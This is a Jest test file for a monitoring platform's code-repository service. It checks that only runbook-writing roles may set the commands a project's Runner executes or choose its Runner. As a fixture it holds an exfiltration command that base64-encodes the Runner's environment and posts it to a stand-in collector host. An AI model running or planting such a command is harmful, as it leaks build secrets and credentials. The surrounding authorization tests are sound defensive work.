import CodeRepositoryService, {
  Service as CodeRepositoryServiceClass,
} from "../../../Server/Services/CodeRepositoryService";
import RunnerService from "../../../Server/Services/RunnerService";
import logger from "../../../Server/Utils/Logger";
import CodeRepository from "../../../Models/DatabaseModels/CodeRepository";
import Runbook from "../../../Models/DatabaseModels/Runbook";
import DatabaseCommonInteractionProps from "../../../Types/BaseDatabase/DatabaseCommonInteractionProps";
import { getRunnerWorkRefusal } from "../../../Types/CodeRepository/CodeRepositoryRunnerAuthoring";
import CodeRepositoryType from "../../../Types/CodeRepository/CodeRepositoryType";
import NotAuthorizedException from "../../../Types/Exception/NotAuthorizedException";
import ObjectID from "../../../Types/ObjectID";
import Permission from "../../../Types/Permission";
import ProjectReferenceCheck from "../../../Server/Utils/Database/ProjectReferenceCheck";
import { ProjectScopedReferenceException } from "../../../Server/Utils/Database/ProjectScopedReferenceValidator";
import { customDomainCaller } from "../API/CustomDomainCallers";
import {
  InMemoryTable,
  StoredRow,
  useInMemoryTable,
} from "../TestingUtils/InMemoryRepository";
import { ON_HIGHEST_PLAN } from "../TestingUtils/RequestPlan";
import { stubProjectDirectory } from "../TestingUtils/ProjectDirectory";
import { getJestSpyOn } from "../../Spy";
import {
  afterEach,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

/*
 * WHO DECIDES WHAT A PROJECT'S RUNNER RUNS FOR A CODE REPOSITORY, through
 * the whole write: the real permission checks, the real hooks and the real
 * success hooks, as each kind of member, against in-memory tables.
 *
 * A repository's setup, build and test commands run on a Runner of the
 * project's own, as the Runner's user, and its Runner setting decides which.
 * A Project Member, a Settings Admin or Member and Edit Code Repository
 * could set a command, pick any of the project's Runners and ask AI to work
 * in the repository: the Runner ran the command with its key in its
 * environment. Writing them now takes what writing a runbook's steps that
 * run takes (Project Owner, Project Admin, Runbook Admin, Edit Runbook):
 *
 *   - a create that sets a command, or picks a Runner, is refused for anyone
 *     else, saying what, why and who may, and nothing is written - from an
 *     API key as from a person, and from Code's own levels too;
 *   - an update that changes one is refused by the columns' own update
 *     lists, and the row is left as it was;
 *   - those who may write runbook steps write them, a team's block on the
 *     permission taking it away;
 *   - a repository with no command and no Runner of its own is created by
 *     whoever may connect one, and its other settings are changed by
 *     whoever may edit it, as before.
 */

const PROJECT_ID: ObjectID = new ObjectID(
  "1f5f0000-0000-4000-8000-000000000003",
);
const REPOSITORY_ID: string = "1f5f0000-0000-4000-8000-0000000000a1";
const RUNNER_ID: string = "1f5f0000-0000-4000-8000-0000000000b1";
const OTHER_RUNNER_ID: string = "1f5f0000-0000-4000-8000-0000000000b2";

// The report's command: the Runner's identity and environment, sent away.
const HOSTILE_COMMAND: string =
  'curl -s https://collector.example/c -d "$(env | base64 -w0)"';

const WRITERS_TITLES: Array<string> = [
  "Project Owner",
  "Project Admin",
  "Edit Runbook",
  "Runbook Admin",
];

function caller(
  permissions: Array<Permission>,
  more: { isApiKey?: boolean; blocks?: Array<Permission> } = {},
): DatabaseCommonInteractionProps {
  return {
    ...customDomainCaller({
      permissions: permissions,
      projectId: PROJECT_ID,
      ...more,
    }),
    ...ON_HIGHEST_PLAN,
  };
}

// Roles that may connect or edit a repository, and may not write what runs.
const NOT_WRITERS: Array<[string, Array<Permission>]> = [
  ["a Project Member", [Permission.ProjectMember]],
  ["a Settings Admin", [Permission.SettingsAdmin]],
  ["a Settings Member", [Permission.SettingsMember]],
  [
    "Create and Edit Code Repository",
    [
      Permission.CreateCodeRepository,
      Permission.EditCodeRepository,
      Permission.ReadCodeRepository,
    ],
  ],
  ["a Code Admin", [Permission.CodeAdmin]],
  ["a Code Member", [Permission.CodeMember]],
];

// Those who write a runbook's steps that run, with a way to edit a repository.
const WRITERS: Array<[string, Array<Permission>]> = [
  ["a Project Owner", [Permission.ProjectOwner]],
  ["a Project Admin", [Permission.ProjectAdmin]],
  [
    "a Runbook Admin who may connect repositories",
    [
      Permission.RunbookAdmin,
      Permission.CreateCodeRepository,
      Permission.EditCodeRepository,
      Permission.ReadCodeRepository,
    ],
  ],
  [
    "Edit Runbook with Create and Edit Code Repository",
    [
      Permission.EditRunbook,
      Permission.CreateCodeRepository,
      Permission.EditCodeRepository,
      Permission.ReadCodeRepository,
    ],
  ],
  [
    "a Project Member who is a Runbook Admin too",
    [Permission.ProjectMember, Permission.RunbookAdmin],
  ],
];

let repositories: InMemoryTable;

function createdRows(): Array<StoredRow> {
  return repositories.rows.filter((row: StoredRow) => {
    return String(row["name"]).startsWith("checkout-service");
  });
}

async function create(
  data: Record<string, unknown>,
  props: DatabaseCommonInteractionProps,
): Promise<CodeRepository> {
  const repository: CodeRepository = new CodeRepository();

  Object.assign(repository, {
    projectId: PROJECT_ID,
    name: "checkout-service",
    repositoryHostedAt: CodeRepositoryType.GitHub,
    organizationName: "acme",
    repositoryName: "checkout-service",
    ...data,
  });

  return await CodeRepositoryService.create({
    data: repository,
    props: props,
  });
}

async function update(
  data: Record<string, unknown>,
  props: DatabaseCommonInteractionProps,
): Promise<void> {
  await CodeRepositoryService.updateOneById({
    id: new ObjectID(REPOSITORY_ID),
    data: data as never,
    props: props,
  });
}

async function refusalOf(promise: Promise<unknown>): Promise<unknown> {
  try {
    await promise;
  } catch (error) {
    return error;
  }

  throw new Error("Expected the write to be refused, but it went through.");
}

beforeEach(() => {
  for (const silenced of ["debug", "info", "warn", "error"]) {
    getJestSpyOn(logger, silenced).mockImplementation((): void => {
      return undefined;
    });
  }

  stubProjectDirectory({});
  getJestSpyOn(CodeRepositoryService, "onTriggerRealtime").mockResolvedValue(
    undefined as never,
  );

  repositories = useInMemoryTable(CodeRepositoryService, [
    {
      _id: REPOSITORY_ID,
      projectId: PROJECT_ID.toString(),
      name: "payments-api",
      slug: "payments-api",
      mainBranchName: "main",
      setupCommand: "npm ci",
      buildCommand: null,
      testCommand: "npm test",
      runnerId: RUNNER_ID,
      isGlobalRunnerPicked: null,
      version: 1,
    },
  ]);

  // The project's Runners: the one the repository picks, and another.
  useInMemoryTable(RunnerService, [
    {
      _id: RUNNER_ID,
      projectId: PROJECT_ID.toString(),
      name: "ci-runner",
      key: "1f5f0000-0000-4000-8000-0000000000c1",
      canRunRunbooks: true,
      isGlobalRunner: false,
      isProjectDefault: false,
    },
    {
      _id: OTHER_RUNNER_ID,
      projectId: PROJECT_ID.toString(),
      name: "prod-eu-west-1",
      key: "1f5f0000-0000-4000-8000-0000000000c2",
      canRunRunbooks: true,
      isGlobalRunner: false,
      isProjectDefault: false,
    },
  ]);
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe("a create that sets a repository's command", () => {
  test.each(NOT_WRITERS)(
    "from %s is refused, saying who may, and nothing is written",
    async (_who: string, permissions: Array<Permission>) => {
      for (const column of ["setupCommand", "buildCommand", "testCommand"]) {
        const error: unknown = await refusalOf(
          create({ [column]: HOSTILE_COMMAND }, caller(permissions)),
        );

        expect(error).toBeInstanceOf(NotAuthorizedException);
        expect((error as Error).message).toBe(
          getRunnerWorkRefusal({
            setsCommand: true,
            picksRunner: false,
            permissionTitles: WRITERS_TITLES,
          }),
        );
      }

      expect(createdRows()).toEqual([]);
      expect(repositories.inserts).toEqual([]);
    },
  );

  test("from a Project Member's API key, too", async () => {
    const error: unknown = await refusalOf(
      create(
        { setupCommand: HOSTILE_COMMAND },
        caller([Permission.ProjectMember], { isApiKey: true }),
      ),
    );

    expect(error).toBeInstanceOf(NotAuthorizedException);
    expect(repositories.inserts).toEqual([]);
  });

  test("a command of one character, or one among empty ones, is a command", async () => {
    for (const data of [
      { setupCommand: "x" },
      { setupCommand: "", buildCommand: "  ", testCommand: "sh evil.sh" },
    ]) {
      const error: unknown = await refusalOf(
        create(data, caller([Permission.ProjectMember])),
      );

      expect(error).toBeInstanceOf(NotAuthorizedException);
    }

    expect(repositories.inserts).toEqual([]);
  });

  test("a team's block on Runbook Admin takes it away from a create, as it does from an update", async () => {
    const error: unknown = await refusalOf(
      create(
        { testCommand: "npm test" },
        caller([Permission.ProjectMember, Permission.RunbookAdmin], {
          blocks: [Permission.RunbookAdmin],
        }),
      ),
    );

    expect(error).toBeInstanceOf(NotAuthorizedException);
    expect(repositories.inserts).toEqual([]);
  });
});

describe("a create that picks a repository's Runner", () => {
  test.each(NOT_WRITERS)(
    "from %s is refused, saying who may, and nothing is written",
    async (_who: string, permissions: Array<Permission>) => {
      for (const data of [
        { runnerId: new ObjectID(OTHER_RUNNER_ID) },
        { runnerId: OTHER_RUNNER_ID },
        { runner: { _id: OTHER_RUNNER_ID } },
      ]) {
        const error: unknown = await refusalOf(
          create(data, caller(permissions)),
        );

        expect(error).toBeInstanceOf(NotAuthorizedException);
        expect((error as Error).message).toBe(
          getRunnerWorkRefusal({
            setsCommand: false,
            picksRunner: true,
            permissionTitles: WRITERS_TITLES,
          }),
        );
      }

      expect(repositories.inserts).toEqual([]);
    },
  );

  test("the report's create - a command and a Runner - is refused, naming both", async () => {
    const error: unknown = await refusalOf(
      create(
        {
          setupCommand: HOSTILE_COMMAND,
          runnerId: new ObjectID(OTHER_RUNNER_ID),
        },
        caller([Permission.ProjectMember]),
      ),
    );

    expect((error as Error).message).toBe(
      getRunnerWorkRefusal({
        setsCommand: true,
        picksRunner: true,
        permissionTitles: WRITERS_TITLES,
      }),
    );
    expect(repositories.inserts).toEqual([]);
  });

  test("a member picking one of the project's own Runners is refused before the Runner is read as OneUptime", async () => {
    const find: jest.Mock = getJestSpyOn(RunnerService, "findOneById");

    const error: unknown = await refusalOf(
      create(
        { runnerId: new ObjectID(OTHER_RUNNER_ID) },
        caller([Permission.ProjectMember]),
      ),
    );

    expect((error as Error).message).toBe(
      getRunnerWorkRefusal({
        setsCommand: false,
        picksRunner: true,
        permissionTitles: WRITERS_TITLES,
      }),
    );
    // The in-cluster Runner check (assertRunnerCanWorkInRepositories) never ran.
    expect(find).not.toHaveBeenCalled();
  });

  test("the project check answers first, as it answers anyone: a Runner it refuses reads the same to a member and a writer", async () => {
    const refusal: ProjectScopedReferenceException =
      new ProjectScopedReferenceException(
        'This Code Repository references records that are not in this project: Runner "1f5f0000-0000-4000-8000-0000000000ff".',
      );

    const check: jest.Mock = getJestSpyOn(
      ProjectReferenceCheck,
      "validateCreate",
    ).mockRejectedValue(refusal as never);

    for (const permissions of [
      [Permission.ProjectMember],
      [Permission.ProjectAdmin],
    ]) {
      const error: unknown = await refusalOf(
        create(
          { runnerId: new ObjectID("1f5f0000-0000-4000-8000-0000000000ff") },
          caller(permissions),
        ),
      );

      expect(error).toBe(refusal);
    }

    expect(check).toHaveBeenCalledTimes(2);
    expect(repositories.inserts).toEqual([]);
  });
});

describe("those who write runbook steps that run write what a Runner runs, as before", () => {
  test.each(WRITERS)(
    "%s creates a repository with its commands and its Runner",
    async (_who: string, permissions: Array<Permission>) => {
      await create(
        {
          setupCommand: "npm ci",
          buildCommand: "npm run build",
          testCommand: "npm test",
          runnerId: new ObjectID(OTHER_RUNNER_ID),
        },
        caller(permissions),
      );

      expect(createdRows()).toHaveLength(1);
      expect(createdRows()[0]).toMatchObject({
        setupCommand: "npm ci",
        buildCommand: "npm run build",
        testCommand: "npm test",
      });
      expect(String(createdRows()[0]!["runnerId"]).toLowerCase()).toBe(
        OTHER_RUNNER_ID,
      );
    },
  );

  test.each(WRITERS)(
    "%s changes them",
    async (_who: string, permissions: Array<Permission>) => {
      await update(
        {
          testCommand: "npm run test:ci",
          runnerId: new ObjectID(OTHER_RUNNER_ID),
        },
        caller(permissions),
      );

      expect(repositories.get(REPOSITORY_ID)!["testCommand"]).toBe(
        "npm run test:ci",
      );
      expect(
        String(repositories.get(REPOSITORY_ID)!["runnerId"]).toLowerCase(),
      ).toBe(OTHER_RUNNER_ID);
    },
  );

  test("a Runbook Admin's API key, too", async () => {
    await create(
      { setupCommand: "npm ci" },
      caller(
        [
          Permission.RunbookAdmin,
          Permission.CreateCodeRepository,
          Permission.ReadCodeRepository,
        ],
        { isApiKey: true },
      ),
    );

    expect(createdRows()).toHaveLength(1);
  });

  test("OneUptime itself and a master admin are not asked", async () => {
    await create({ setupCommand: "npm ci" }, { isRoot: true });
    expect(createdRows()).toHaveLength(1);

    await update(
      { buildCommand: "make" },
      { ...caller([]), isMasterAdmin: true, isRoot: false },
    );
    expect(repositories.get(REPOSITORY_ID)!["buildCommand"]).toBe("make");
  });
});

describe("a repository that runs nothing of its own is created by whoever may connect one", () => {
  test.each(NOT_WRITERS)(
    "%s creates it with no commands and no Runner, and with each empty",
    async (_who: string, permissions: Array<Permission>) => {
      await create({}, caller(permissions));

      await create(
        {
          name: "checkout-service-two",
          repositoryName: "checkout-service-two",
          setupCommand: null,
          buildCommand: "",
          testCommand: "   ",
          runnerId: null,
        },
        caller(permissions),
      );

      expect(createdRows()).toHaveLength(2);
    },
  );

  test.each([
    ["on the Global Runner", true],
    ["following the project's default Runner", false],
  ])(
    "a Project Member creates it %s",
    async (_where: string, isGlobalRunnerPicked: boolean) => {
      await create(
        { isGlobalRunnerPicked: isGlobalRunnerPicked },
        caller([Permission.ProjectMember]),
      );

      expect(createdRows()).toHaveLength(1);
      expect(createdRows()[0]!["isGlobalRunnerPicked"]).toBe(
        isGlobalRunnerPicked,
      );
    },
  );
});

describe("changing what a Runner runs for a repository is held to the columns' update lists", () => {
  test.each(NOT_WRITERS)(
    "%s changes no command and no Runner - not even to clear them - and the row is as it was",
    async (_who: string, permissions: Array<Permission>) => {
      for (const data of [
        { setupCommand: HOSTILE_COMMAND },
        { buildCommand: "make" },
        { testCommand: null },
        { setupCommand: null, buildCommand: null, testCommand: null },
        { runnerId: new ObjectID(OTHER_RUNNER_ID) },
        { runnerId: null },
        { isGlobalRunnerPicked: true },
      ]) {
        const error: unknown = await refusalOf(
          update(data, caller(permissions)),
        );

        expect(error).toBeDefined();
      }

      expect(repositories.get(REPOSITORY_ID)).toMatchObject({
        setupCommand: "npm ci",
        buildCommand: null,
        testCommand: "npm test",
        runnerId: RUNNER_ID,
        isGlobalRunnerPicked: null,
      });
      expect(repositories.updates).toEqual([]);
    },
  );

  test.each([
    ["a Project Member", [Permission.ProjectMember]],
    [
      "Edit Code Repository",
      [Permission.EditCodeRepository, Permission.ReadCodeRepository],
    ],
    ["a Code Admin", [Permission.CodeAdmin]],
  ])(
    "%s still changes the repository's other settings",
    async (_who: string, permissions: Array<Permission>) => {
      await update(
        {
          description: "Checkout and payments",
          mainBranchName: "trunk",
          isGitHubCommandsEnabled: false,
        },
        caller(permissions),
      );

      expect(repositories.get(REPOSITORY_ID)).toMatchObject({
        description: "Checkout and payments",
        mainBranchName: "trunk",
        isGitHubCommandsEnabled: false,
        // And not what a Runner runs.
        setupCommand: "npm ci",
        testCommand: "npm test",
      });
    },
  );
});

describe("who may decide what a Runner runs for a repository", () => {
  test("is Runbook.steps' update list", () => {
    expect(CodeRepositoryServiceClass.getRunnerWorkWriters()).toEqual(
      new Runbook().getColumnAccessControlFor("steps")?.update,
    );
    expect(CodeRepositoryServiceClass.getRunnerWorkWriters()).toEqual([
      Permission.ProjectOwner,
      Permission.ProjectAdmin,
      Permission.EditRunbook,
      Permission.RunbookAdmin,
    ]);
  });

  test.each([
    ["a Project Owner", [Permission.ProjectOwner], true],
    ["a Project Admin", [Permission.ProjectAdmin], true],
    ["a Runbook Admin", [Permission.RunbookAdmin], true],
    ["Edit Runbook", [Permission.EditRunbook], true],
    ["a Project Member", [Permission.ProjectMember], false],
    ["a Settings Admin", [Permission.SettingsAdmin], false],
    ["a Settings Member", [Permission.SettingsMember], false],
    ["Edit Code Repository", [Permission.EditCodeRepository], false],
    ["a Code Admin", [Permission.CodeAdmin], false],
    ["a Runbook Member, who runs runbooks", [Permission.RunbookMember], false],
    ["Create Runbook alone", [Permission.CreateRunbook], false],
    ["Edit Runner", [Permission.EditRunner], false],
    ["a Viewer", [Permission.Viewer], false],
  ])(
    "mayWriteWhatRunnersRun: %s -> %s",
    (_who: string, permissions: Array<Permission>, expected: boolean) => {
      expect(
        CodeRepositoryServiceClass.mayWriteWhatRunnersRun(caller(permissions)),
      ).toBe(expected);
    },
  );

  test("a block on the permission takes it away", () => {
    expect(
      CodeRepositoryServiceClass.mayWriteWhatRunnersRun(
        caller([Permission.ProjectAdmin], {
          blocks: [Permission.ProjectAdmin],
        }),
      ),
    ).toBe(false);
  });

  test("OneUptime itself and a master admin may", () => {
    expect(
      CodeRepositoryServiceClass.mayWriteWhatRunnersRun({ isRoot: true }),
    ).toBe(true);
    expect(
      CodeRepositoryServiceClass.mayWriteWhatRunnersRun({
        isMasterAdmin: true,
      }),
    ).toBe(true);
  });
});
